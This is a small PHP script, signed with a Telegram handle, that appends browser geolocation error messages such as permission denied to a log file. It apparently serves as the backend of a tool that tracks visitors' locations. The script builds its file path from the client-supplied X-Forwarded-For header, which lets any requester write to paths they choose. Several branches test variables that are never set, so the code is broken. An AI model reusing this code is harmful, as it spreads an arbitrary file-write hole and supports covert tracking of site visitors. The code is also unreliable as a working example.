<?php

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$file_path = $ip. "/errors.txt";
$f = fopen($file_path, 'a');
fwrite($f, " \r \n " );

header('Content-Type: text/html');
{
  $denied = $_POST['Denied'];
  $support = 'Geolocation is not supported!';

  if (isset($denied))
  {
    $f = fopen($file_path, 'a');
    fwrite($f, $denied);
    fclose($f);
  }
  elseif (isset($una))
  {
    $f = fopen($file_path, 'a');
    fwrite($f, $una);
    fclose($f);
  }
  elseif (isset($time))
  {
    $f = fopen($file_path, 'a');
    fwrite($f, $time);
    fclose($f);
  }
  elseif (isset($unk))
  {
    $f = fopen($file_path, 'a');
    fwrite($f, $unk);
    fclose($f);
  }
  else
  {
    $f = fopen($file_path, 'a');
    fwrite($f, $support);
    fclose($f);
  }
}
?>
//by Ahmad Allam
//my telegram @echo_me